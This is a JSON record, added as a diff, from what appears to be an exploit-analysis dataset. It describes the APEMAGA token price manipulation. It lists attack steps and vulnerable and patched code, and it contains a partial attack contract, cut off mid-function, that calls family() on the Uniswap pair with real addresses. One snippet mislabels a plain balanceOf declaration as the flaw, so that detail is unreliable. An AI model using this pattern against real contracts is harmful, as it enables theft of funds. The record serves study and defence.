@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-06-XX_APEMAGA_FamilySyncPriceManipulation",
+ "source_file": "2024/2024-06-XX_APEMAGA_FamilySyncPriceManipulation.md",
+ "title": "APEMAGA — family() + sync() Price Manipulation Analysis",
+ "date": "2024-06-01",
+ "protocol": "APEMAGA",
+ "chain": "Ethereum",
+ "loss_raw": "~9 ETH",
+ "loss_usd": null,
+ "root_cause": "Calling `family()` with the pair address 3 times to manipulate internal reward state, then calling `sync()` to resync reserve balances to extract arbitrage profit",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: family() has no access control\ncontract APEMAGA {\n    mapping(address => uint256) public familyRewards;\n    mapping(address => uint256) public lastFamilyCall;\n\n    // Anyone can call this targeting any arbitrary address\n    function family(address account) external {\n        // No access control — attacker calls repeatedly with the pair address\n        uint256 reward = calculateReward(account);\n        familyRewards[account] += reward;\n        // Internal balance state change → pair reserve mismatch\n        _balances[account] += reward;\n    }\n}\n\n//",
+  "// File: Tonken.sol\ncontract IERC20 {\n    function balanceOf(address account) external view returns (uint256);  // ❌ Vulnerability\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n}"
+ ],
+ "code_after": [
+  "✅ Safe code\nfunction family(address account) external {\n    // Only the reward recipient themselves can call\n    require(account == msg.sender, \"only self\");\n    // Or block pair/contract addresses\n    require(!_isLiquidityPair[account], \"cannot call for pair\");\n    uint256 reward = calculateReward(account);\n    familyRewards[account] += reward;\n    _balances[account] += reward;\n}"
+ ],
+ "steps": [
+  "→ [1] APEMAGA.family(pair) × 3 calls",
+  "No access control → pair._balances += reward × 3",
+  "→ [2] Uniswap V2 pair.sync()",
+  "→ [3] APEMAGA → WETH swap (at distorted price)",
+  "→ [4] ~9 ETH drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] APEMAGA.family(pair) × 3 calls\n  │         └─ No access control → pair._balances += reward × 3\n  │         └─ Actual reserves and internal balance mismatch\n  │\n  ├─→ [2] Uniswap V2 pair.sync()\n  │         └─ reserve0/reserve1 force resynced\n  │         └─ Price distortion occurs\n  │\n  ├─→ [3] APEMAGA → WETH swap (at distorted price)\n  │         └─ Favorable exchange rate obtained via manipulated reserves\n  │\n  └─→ [4] ~9 ETH drained",
+  "interface IAPEMAGA {\n    function family(address account) external;\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\ninterface IUniswapV2Pair {\n    function sync() external;\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;\n    function getReserves() external view returns (uint112 r0, uint112 r1, uint32 ts);\n}\n\ncontract AttackContract {\n    IAPEMAGA constant apemaga = IAPEMAGA(0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C);\n    IUniswapV2Pair constant pair = IUniswapV2Pair(0x85705829c2f71EE3c40A7C28f6903e7c797c9433);\n\n    function testExploit() external {\n        // [1] Call family() with pair address 3 times — manipulate pair balance\n        apemaga.family(address(pair));\n        apemaga.family(address(pair));\n  "
+ ]
+}
